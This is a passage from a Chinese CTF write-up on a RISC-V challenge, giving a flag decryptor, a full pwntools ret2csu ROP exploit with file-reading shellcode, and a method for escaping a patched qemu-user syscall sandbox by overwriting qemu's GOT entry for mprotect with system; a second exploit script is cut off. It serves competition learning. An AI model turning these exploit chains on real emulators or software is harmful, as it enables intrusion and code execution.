        v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
    }                                              /* end cycle */  
    printf("%#x\n", sum);
    v[0]=v0; v[1]=v1;
}  

void tea_dec (uint32_t* v, uint32_t* k) {  
    uint32_t v0=v[0], v1=v[1], sum=0xe3779b90, i;  /* set up */  
    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */  
    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   /* cache key */  
    for (i=0; i<16; i++) {                         /* basic cycle start */  
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);  
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);  
        sum -= delta;  
    }                                              /* end cycle */  
    v[0]=v0; v[1]=v1;  
}  

int main(){
    tea_enc();
    char flag1[flag1_len] = {0};
    struct chacha20_context context;
    chacha20_init_context(&context, "tzgkwukglbslrmfjsrwimtwyyrkejqzo","oaeqjfhclrqk",0x80);
    char *flag1_enc_ro = "\x88\xE7\x03\xB4\x36\xCD\x97\xAB\x5A\xA5\xA6\x0B\xDF\xCE\x08\x3B\x9D\x90\x32\x3C\x4E\x15\x14\xBD\x8D\x38\x38\xB0\xEE\x2A\xBC\x4B\xF9\xAA\x24\x26\x76\xA3\xA5\x75\x5E";

    // char *flag1_enc[flag1_len]
    memcpy(flag1, flag1_enc_ro, flag1_len);

    chacha20_xor(&context, flag1, flag1_len);

    uint32_t flag2[13]={3293612025,117699250,1769272380,3988044633,267431978,8724722,4258079709,889342069,4057446099,1962023905,3408772882,2763281398, 0};
    uint32_t k[4]={325623995, 420138526, 903390039, 650062945};  
    for(int i=0; i<6; i++){
        tea_dec(&flag2[i*2], k);
    }
    printf("%s%s", flag1, (char *)flag2);
}
```



### second flag-orw

后面两个部分网上已经有很多 wp 了, 宇轩师傅的 wp 就很详细: https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/#

gets 那个地方有个栈溢出, 因为 qemu-user 是没有随机化的, 而且本题栈是可执行的, 所以有些师傅的做法就是把 shellcode 写到栈上, 然后到栈上执行. 不过这种方法还是需要调试拿到栈地址, 而且本地和远程栈地址可能还不一样, 好在这题提供了 Dockerfile , 所以本地可以搭一个和远程一样的环境. 我复现的时候选择了更通用的方法: rop+shellcode.

说到 rop 就离不开 csu_init, ret2csu 通用性是真的强, 从 x86 到 amd64 到 aarch64 都很通用, 到了 riscv 也很通用.  csu_init 通常是 **libc_start_main的第四个参数**, 对于去符号的 binary 我们可以通过这个性质定位到 csu_init 函数. 本题中位于`0x00011720`处. 反编译得到的伪代码如下:

```c

void UndefinedFunction_00011720(undefined8 param_1,undefined8 param_2,undefined8 param_3){
  undefined **ppuVar1;
  longlong lVar2;
  
  ppuVar1 = &PTR_FUN_0006cb80;
  lVar2 = 0;
  do {
    lVar2 = lVar2 + 1;
    (*(code *)*ppuVar1)(param_1,param_2,param_3,*ppuVar1);
    ppuVar1 = (code **)ppuVar1 + 1;
  } while (lVar2 != 1);
  ppuVar1 = &PTR_FUN_0006cb88;
  lVar2 = 0;
  do {
    lVar2 = lVar2 + 1;
    (*(code *)*ppuVar1)(param_1,param_2,param_3,*ppuVar1);
    ppuVar1 = (code **)ppuVar1 + 1;
  } while (lVar2 != 1);
  gp = (undefined *)0x6f178;
  return;
}

```

我们选取其中的这部分代码进行利用:

```
        00011772 93 07 84 b8     addi       a5,s0,-0x478
        00011776 13 09 09 b9     addi       s2,s2,-0x470
        0001177a 33 09 f9 40     sub        s2,s2,a5
        0001177e 13 59 39 40     srai       s2,s2,0x3
        00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e
        00011786 13 04 84 b8     addi       s0,s0,-0x478
        0001178a 81 44           c.li       s1,0x0
                             LAB_0001178c                                    XREF[1]:     0001179a(j)  
        0001178c 1c 60           c.ld       a5=>->FUN_00010284,0x0(s0=>->FUN_00010250)       = 00010284
                                                                                             = 00010250
        0001178e 56 86           c.mv       a2,s5
        00011790 d2 85           c.mv       a1,s4
        00011792 4e 85           c.mv       a0,s3
        00011794 85 04           c.addi     s1,0x1
        00011796 82 97           c.jalr     a5=>FUN_00010284                                 undefined FUN_00010250()
                                                                                             undefined FUN_00010284()
        00011798 21 04           c.addi     s0,0x8
        0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c
                             LAB_0001179e                                    XREF[1]:     00011782(j)  
        0001179e e2 70           c.ldsp     ra,0x38(sp)
        000117a0 42 74           c.ldsp     s0,0x30(sp)
        000117a2 a2 74           c.ldsp     s1,0x28(sp)
        000117a4 02 79           c.ldsp     s2,0x20(sp)
        000117a6 e2 69           c.ldsp     s3,0x18(sp)
        000117a8 42 6a           c.ldsp     s4,0x10(sp)
        000117aa a2 6a           c.ldsp     s5,0x8(sp)
        000117ac 21 61           c.addi16sp sp,0x40
        000117ae 82 80           ret
```

具体利用过程如下:

1. 覆盖栈上的返回地址为  0x0001179e
2. 执行 0x0001179e 到 0x000117ae 之间的代码时通过栈上的值控制以下寄存器
   1. ra = 0x00011772
   2. s0 = gets + 0x478
   3. s2 = gets + 0x470
3. ret 到 0x00011772 继续执行:
   1. a5 = gets
   2. 0x00011782 处判断因为 s0 和 s5 相等, 所以跳到 0x0001179e 处继续执行
4. 执行 0x0001179e 到 0x000117ae 之间的代码时通过栈上的值控制以下寄存器
   1. ra = 0x0001178e
   2. s3 = bss_addr
   3. s1 = 0
   4. s2 = 1
5. ret 到 0x0001178e 继续执行
   1. a0 = s3 = bss_addr
   2. jal a5 # 执行 gets(bss_addr) 可以把orw shellcode读进去.
   3. s1 = s1 + 1  -> s1 = 1 = s2
   4. 0x0001179a 分支指令因为 s1 和 s2 相等跳到 0x0001179e 处继续执行
6. 等价于回到第一步, 只要栈上我们可以控制的内存足够大, 就可以进行任意次 rop
   1. 此时我们可以跳动 bss_addr 执行已经读入的 shellcode.

完整的 exp 如下:

```python
#coding:utf-8
from pwn import *
import pwn_framework as pf
from time import sleep
import sys

global io
ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

context(bits = 64, os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "./main"

elf = ELF(filename)
io = process(["./qemu-riscv64", "-g", "1234", "main"])

def lg(name, val):
    log.info(name+" : "+hex(val))

gets_addr = 0x00016a5a
bss = 0x00000000006f000
gad1 = 0x0001179e
gad2 = 0x00011772
gad3 = 0x0001178e
"""
        00011772 93 07 84 b8     addi       a5,s0,-0x478
        00011776 13 09 09 b9     addi       s2,s2,-0x470
        0001177a 33 09 f9 40     sub        s2,s2,a5
        0001177e 13 59 39 40     srai       s2,s2,0x3
        00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e
        00011786 13 04 84 b8     addi       s0,s0,-0x478
        0001178a 81 44           c.li       s1,0x0
                             LAB_0001178c                                    XREF[1]:     0001179a(j)  
        0001178c 1c 60           c.ld       a5=>->FUN_00010284,0x0(s0=>->FUN_00010250)       = 00010284
                                                                                             = 00010250
        0001178e 56 86           c.mv       a2,s5
        00011790 d2 85           c.mv       a1,s4
        00011792 4e 85           c.mv       a0,s3
        00011794 85 04           c.addi     s1,0x1
        00011796 82 97           c.jalr     a5=>FUN_00010284                                 undefined FUN_00010250()
                                                                                             undefined FUN_00010284()
        00011798 21 04           c.addi     s0,0x8
        0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c
                             LAB_0001179e                                    XREF[1]:     00011782(j)  
        0001179e e2 70           c.ldsp     ra,0x38(sp)
        000117a0 42 74           c.ldsp     s0,0x30(sp)
        000117a2 a2 74           c.ldsp     s1,0x28(sp)
        000117a4 02 79           c.ldsp     s2,0x20(sp)
        000117a6 e2 69           c.ldsp     s3,0x18(sp)
        000117a8 42 6a           c.ldsp     s4,0x10(sp)
        000117aa a2 6a           c.ldsp     s5,0x8(sp)
        000117ac 21 61           c.addi16sp sp,0x40
        000117ae 82 80           ret
"""

def gen_rop_chain(target, a0=0, a1=0, a2=0):
    payload = flat({
        0x40 * 0 + 0x38: gad2, # jmp to gad2
        0x40 * 0 + 0x30: target + 0x478, # set s0, a5 = s0 - 0x478
        0x40 * 0 + 0x20: target + 0x470, # set s2

        0x40 * 1 + 0x38: gad3, # jmp to gad3
        0x40 * 1 + 0x18: a0, # set s3, a0 = s3
        0x40 * 1 + 0x10: a1, # set s4, a1 = s4
        0x40 * 1 + 0x08: a2, # set s5, a2 = s5
        0x40 * 1 + 0x28: 0, # s1
        0x40 * 1 + 0x20: 1, # s2
    }, length=0x80, filler=b'\x00')
    return payload

p1 = flat(
    # b"flag{have_you_tried_ghidra9.2_decompiler_@if_you_have_hexriscv_plz_share_it_with_me_thx:P}".ljust(0x118, '\x00'),
    b'a'*0x118,
    0xdeadbeef, # S0
    gad1, # ra
    gen_rop_chain(gets_addr, bss),
    gen_rop_chain(bss)
)

sla(io, "flag", p1)

sc = open("./sc.bin", "rb").read()

sla(io, "wrong", sc)

io.interactive()
```

sc.bin 由如下代码生成:

```c
#include <linux/unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static char flag_path[] = "/flag";
// __attribute__((section(".text#"))) static char flag_path[] = "/flag";

int syscall(uint64_t nr, ...);

void _start(){
    char buf[0x400];
    int fd = syscall(__NR_openat, AT_FDCWD, flag_path, 0, 0);
    syscall(__NR_read, fd, buf, sizeof(buf));
    syscall(__NR_write, 1, buf, sizeof(buf));
}

asm(
    "syscall:\n"
        "mv a7, a0\n"
        "mv a0, a1\n"
        "mv a1, a2\n"
        "mv a2, a3\n"
        "mv a3, a4\n"
        "mv a4, a5\n"
        "mv a5, a6\n"
        "ecall\n"
        "ret\n"
);

/*
riscv64-linux-gnu-gcc-10 -Wa,-R -fPIC -O0 -nostdlib sc.c -o sc
riscv64-linux-gnu-objcopy -S -O binary -j .text ./sc ./sc.bin
riscv64-linux-gnu-objdump -d ./sc | less
*/
```

关于使用 c 代码生成 shellcode 的更多详情可以参考我的另一篇文章: https://pullp.github.io/2021/01/30/shellcode-tips/

### third flag-getshell

第三个 flag 需要执行服务器上的一个程序 `readflag` 才可以拿到, 所以需要 getshell, 但是这个 qemu-user 是被 patch 过的, 附件中有patch 文件:

```
diff --git a/linux-user/syscall.c b/linux-user/syscall.c
index 27adee9..2d75464 100644
--- a/linux-user/syscall.c
+++ b/linux-user/syscall.c
@@ -13101,8 +13101,31 @@ abi_long do_syscall(void *cpu_env, int num, abi_long arg1,
         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);
     }
 
-    ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,
-                      arg5, arg6, arg7, arg8);
+    switch (num) {
+        // syscall whitelist
+        case TARGET_NR_brk:
+        case TARGET_NR_uname:
+        case TARGET_NR_readlinkat:
+        case TARGET_NR_faccessat:
+        case TARGET_NR_openat2:
+        case TARGET_NR_openat:
+        case TARGET_NR_read:
+        case TARGET_NR_readv:
+        case TARGET_NR_write:
+        case TARGET_NR_writev:
+        case TARGET_NR_mmap:
+        case TARGET_NR_munmap:
+        case TARGET_NR_exit:
+        case TARGET_NR_exit_group:
+        case TARGET_NR_mprotect:
+            ret = do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,
+                    arg5, arg6, arg7, arg8);
+            break;
+        default:
+            printf("[!] %d bad system call\n", num);
+            ret = -1;
+            break;
+    }
 
     if (unlikely(qemu_loglevel_mask(LOG_STRACE))) {
         print_syscall_ret(cpu_env, num, ret, arg1, arg2,
```

从 patch 文件中我们可以发现 qemu-user 有个 syscall 沙箱, 只能使用部分 syscall, 关键的 execve 我们是无法使用的. 不过 qemu usermode 下 guest 程序和qemu 本体其实是出于同一个进程空间的, 通过对 qemu 调试我们可以发现:

```bash
$ gdb -q ./qemu-riscv64
...
gef> run ./main
...
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000010000 0x000000000006c000 0x0000000000000000 r-- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&pwn-favourite architecture/release/share/main
0x000000000006c000 0x000000000006f000 0x000000000005b000 rw- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&pwn-favourite architecture/release/share/main
0x000000000006f000 0x0000000000093000 0x0000000000000000 rw-
0x0000004000000000 0x0000004000001000 0x0000000000000000 ---
0x0000004000001000 0x0000004000801000 0x0000000000000000 rw-
0x0000555555554000 0x00005555559bd000 0x0000000000000000 r-x /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&pwn-favourite architecture/release/share/qemu-riscv64
0x0000555555bbc000 0x0000555555bf8000 0x0000000000468000 r-- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&pwn-favourite architecture/release/share/qemu-riscv64
0x0000555555bf8000 0x0000555555c24000 0x00000000004a4000 rw- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&pwn-favourite architecture/release/share/qemu-riscv64
0x0000555555c24000 0x0000555555cea000 0x0000000000000000 rw- [heap]
0x00007fffe8000000 0x00007fffeffff000 0x0000000000000000 rwx
0x00007fffeffff000 0x00007ffff0000000 0x0000000000000000 ---
0x00007ffff0000000 0x00007ffff0021000 0x0000000000000000 rw-
0x00007ffff0021000 0x00007ffff4000000 0x0000000000000000 ---
0x00007ffff6c3e000 0x00007ffff6cbf000 0x0000000000000000 rw-
0x00007ffff6cbf000 0x00007ffff6cc0000 0x0000000000000000 ---
0x00007ffff6cc0000 0x00007ffff74c5000 0x0000000000000000 rw-
0x00007ffff74c5000 0x00007ffff74c6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libdl-2.31.so
0x00007ffff74c6000 0x00007ffff74c8000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/libdl-2.31.so
0x00007ffff74c8000 0x00007ffff74c9000 0x0000000000003000 r-- /usr/lib/x86_64-linux-gnu/libdl-2.31.so
0x00007ffff74c9000 0x00007ffff74ca000 0x0000000000003000 r-- /usr/lib/x86_64-linux-gnu/libdl-2.31.so
0x00007ffff74ca000 0x00007ffff74cb000 0x0000000000004000 rw- /usr/lib/x86_64-linux-gnu/libdl-2.31.so
0x00007ffff74cb000 0x00007ffff74cd000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff74cd000 0x00007ffff74d3000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff74d3000 0x00007ffff74d4000 0x0000000000008000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff74d4000 0x00007ffff74d5000 0x0000000000009000 --- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff74d5000 0x00007ffff74d6000 0x0000000000009000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff74d6000 0x00007ffff74d7000 0x000000000000a000 rw- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff74d7000 0x00007ffff74d9000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3
0x00007ffff74d9000 0x00007ffff752a000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3
0x00007ffff752a000 0x00007ffff7548000 0x0000000000053000 r-- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3
0x00007ffff7548000 0x00007ffff7549000 0x0000000000070000 r-- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3
0x00007ffff7549000 0x00007ffff754a000 0x0000000000071000 rw- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3
0x00007ffff754a000 0x00007ffff7554000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0
0x00007ffff7554000 0x00007ffff75b4000 0x000000000000a000 r-x /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0
0x00007ffff75b4000 0x00007ffff75cb000 0x000000000006a000 r-- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0
0x00007ffff75cb000 0x00007ffff75cc000 0x0000000000081000 --- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0
0x00007ffff75cc000 0x00007ffff75cd000 0x0000000000081000 r-- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0
0x00007ffff75cd000 0x00007ffff75ce000 0x0000000000082000 rw- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0
0x00007ffff75ce000 0x00007ffff75d5000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0
0x00007ffff75d5000 0x00007ffff75e6000 0x0000000000007000 r-x /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0
0x00007ffff75e6000 0x00007ffff7604000 0x0000000000018000 r-- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0
0x00007ffff7604000 0x00007ffff7605000 0x0000000000035000 r-- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0
0x00007ffff7605000 0x00007ffff7606000 0x0000000000036000 rw- /usr/lib/x86_64-linux-gnu/libhogweed.so.5.0
0x00007ffff7606000 0x00007ffff7608000 0x0000000000000000 rw-
0x00007ffff7608000 0x00007ffff7611000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0
0x00007ffff7611000 0x00007ffff762f000 0x0000000000009000 r-x /usr/lib/x86_64-linux-gnu/libnettle.so.7.0
0x00007ffff762f000 0x00007ffff763f000 0x0000000000027000 r-- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0
0x00007ffff763f000 0x00007ffff7641000 0x0000000000036000 r-- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0
0x00007ffff7641000 0x00007ffff7642000 0x0000000000038000 rw- /usr/lib/x86_64-linux-gnu/libnettle.so.7.0
0x00007ffff7642000 0x00007ffff7645000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
0x00007ffff7645000 0x00007ffff7651000 0x0000000000003000 r-x /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
0x00007ffff7651000 0x00007ffff7655000 0x000000000000f000 r-- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
0x00007ffff7655000 0x00007ffff7656000 0x0000000000013000 --- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
0x00007ffff7656000 0x00007ffff7657000 0x0000000000013000 r-- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
0x00007ffff7657000 0x00007ffff7658000 0x0000000000014000 rw- /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.0
0x00007ffff7658000 0x00007ffff7668000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
0x00007ffff7668000 0x00007ffff769e000 0x0000000000010000 r-x /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
0x00007ffff769e000 0x00007ffff77d5000 0x0000000000046000 r-- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
0x00007ffff77d5000 0x00007ffff77d6000 0x000000000017d000 --- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
0x00007ffff77d6000 0x00007ffff77d9000 0x000000000017d000 r-- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
0x00007ffff77d9000 0x00007ffff77da000 0x0000000000180000 rw- /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
0x00007ffff77da000 0x00007ffff77dc000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
0x00007ffff77dc000 0x00007ffff77e1000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
0x00007ffff77e1000 0x00007ffff77f8000 0x0000000000007000 r-- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
0x00007ffff77f8000 0x00007ffff77f9000 0x000000000001e000 --- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
0x00007ffff77f9000 0x00007ffff77fa000 0x000000000001e000 r-- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
0x00007ffff77fa000 0x00007ffff77fb000 0x000000000001f000 rw- /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
0x00007ffff77fb000 0x00007ffff7826000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
0x00007ffff7826000 0x00007ffff78c0000 0x000000000002b000 r-x /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
0x00007ffff78c0000 0x00007ffff791c000 0x00000000000c5000 r-- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
0x00007ffff791c000 0x00007ffff7927000 0x0000000000120000 r-- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
0x00007ffff7927000 0x00007ffff7931000 0x000000000012b000 rw- /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
0x00007ffff7931000 0x00007ffff7956000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7956000 0x00007ffff7ace000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7ace000 0x00007ffff7b18000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7b18000 0x00007ffff7b19000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7b19000 0x00007ffff7b1c000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7b1c000 0x00007ffff7b1f000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7b1f000 0x00007ffff7b25000 0x0000000000000000 rw-
0x00007ffff7b25000 0x00007ffff7b2c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
0x00007ffff7b2c000 0x00007ffff7b3d000 0x0000000000007000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
0x00007ffff7b3d000 0x00007ffff7b42000 0x0000000000018000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
0x00007ffff7b42000 0x00007ffff7b43000 0x000000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
0x00007ffff7b43000 0x00007ffff7b44000 0x000000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
0x00007ffff7b44000 0x00007ffff7b48000 0x0000000000000000 rw-
0x00007ffff7b48000 0x00007ffff7b4b000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7b4b000 0x00007ffff7b5d000 0x0000000000003000 r-x /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7b5d000 0x00007ffff7b61000 0x0000000000015000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7b61000 0x00007ffff7b62000 0x0000000000018000 r-- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7b62000 0x00007ffff7b63000 0x0000000000019000 rw- /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
0x00007ffff7b63000 0x00007ffff7b72000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so
0x00007ffff7b72000 0x00007ffff7c19000 0x000000000000f000 r-x /usr/lib/x86_64-linux-gnu/libm-2.31.so
0x00007ffff7c19000 0x00007ffff7cb0000 0x00000000000b6000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so
0x00007ffff7cb0000 0x00007ffff7cb1000 0x000000000014c000 r-- /usr/lib/x86_64-linux-gnu/libm-2.31.so
0x00007ffff7cb1000 0x00007ffff7cb2000 0x000000000014d000 rw- /usr/lib/x86_64-linux-gnu/libm-2.31.so
0x00007ffff7cb2000 0x00007ffff7cce000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6
0x00007ffff7cce000 0x00007ffff7d52000 0x000000000001c000 r-x /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6
0x00007ffff7d52000 0x00007ffff7dd7000 0x00000000000a0000 r-- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6
0x00007ffff7dd7000 0x00007ffff7dd8000 0x0000000000125000 --- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6
0x00007ffff7dd8000 0x00007ffff7dd9000 0x0000000000125000 r-- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6
0x00007ffff7dd9000 0x00007ffff7dda000 0x0000000000126000 rw- /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0.6400.6
0x00007ffff7dda000 0x00007ffff7ddb000 0x0000000000000000 rw-
0x00007ffff7ddb000 0x00007ffff7e0a000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0
0x00007ffff7e0a000 0x00007ffff7f2c000 0x000000000002f000 r-x /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0
0x00007ffff7f2c000 0x00007ffff7f9d000 0x0000000000151000 r-- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0
0x00007ffff7f9d000 0x00007ffff7f9e000 0x00000000001c2000 --- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0
0x00007ffff7f9e000 0x00007ffff7fad000 0x00000000001c2000 r-- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0
0x00007ffff7fad000 0x00007ffff7faf000 0x00000000001d1000 rw- /usr/lib/x86_64-linux-gnu/libgnutls.so.30.27.0
0x00007ffff7faf000 0x00007ffff7fb1000 0x0000000000000000 rw-
0x00007ffff7fb1000 0x00007ffff7fb4000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/librt-2.31.so
0x00007ffff7fb4000 0x00007ffff7fb8000 0x0000000000003000 r-x /usr/lib/x86_64-linux-gnu/librt-2.31.so
0x00007ffff7fb8000 0x00007ffff7fb9000 0x0000000000007000 r-- /usr/lib/x86_64-linux-gnu/librt-2.31.so
0x00007ffff7fb9000 0x00007ffff7fba000 0x0000000000008000 --- /usr/lib/x86_64-linux-gnu/librt-2.31.so
0x00007ffff7fba000 0x00007ffff7fbb000 0x0000000000008000 r-- /usr/lib/x86_64-linux-gnu/librt-2.31.so
0x00007ffff7fbb000 0x00007ffff7fbc000 0x0000000000009000 rw- /usr/lib/x86_64-linux-gnu/librt-2.31.so
0x00007ffff7fbc000 0x00007ffff7fbe000 0x0000000000000000 rw-
0x00007ffff7fcb000 0x00007ffff7fce000 0x0000000000000000 r-- [vvar]
0x00007ffff7fce000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
```

最上面的的几行就是 guest 程序的内存部分, 然后就是 qemu 的内存部分.  

既然在同一个地址空间中, 那么从 guest 程序中访问 qemu 内存自然也就是一件很合理的事情了. 后面就是常规的 pwn 套路了.

因为 qemu 开了随机化, 首先我们需要 leak qemu 和 libc 的地址. leak 地址方法目前知道有三个:

- 读 /./proc/self/maps文件:
  - 思路来自redbud的师傅
  - 可以拿到整个qemu 内存空间的地址, 推荐
  - 如果读 /proc/self/maps 只能读到 guest程序自己的内存空间, qemu有个过滤操作, 具体可以参考[宇轩师傅的wp](https://xuanxuanblingbling.github.io/ctf/pwn/2021/01/22/riscv/)写的很详细.
- 读 /proc/self/syscall 来自 0ops 师傅的思路. 具体原理自行 `man proc`
  - 这个 方法我没有实践, 通过看文档中对该文件的定义觉得该方法leak的地址可能不太稳定, 不过了解一下万一哪天用得到(比如上一个方法被封了233)
- mmap 一块已经存在的内存, 系统会返回一块 libc 附近的内存, 从而 leak libc 地址
  - 来自enlx师傅的思路
  - 这种方法leak的地址和libc的偏移不同环境下可能不一样, 需要试一下.

综上, 笔者在复现的时候选择了读 /./proc/self/maps 文件的思路. 具体利用过程如下:

1. leak qemu 和 libc 地址
2. leak 完地址之后利用没有被 ban 的 mprotect syscall 将 qemu 的 got 所在的段改成 rwx.
3. 然后把 got[mprotect] 改成 system 地址.
4. 在一个地址 addr 处(该地址需要页(0x1000)对齐)写入"/bin/sh\0"
5. mprotect(addr, 0, 0)
6. PWN!

完整 exp 如下:

```python
#coding:utf-8
from pwn import *
from time import sleep
import sys

global io
ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
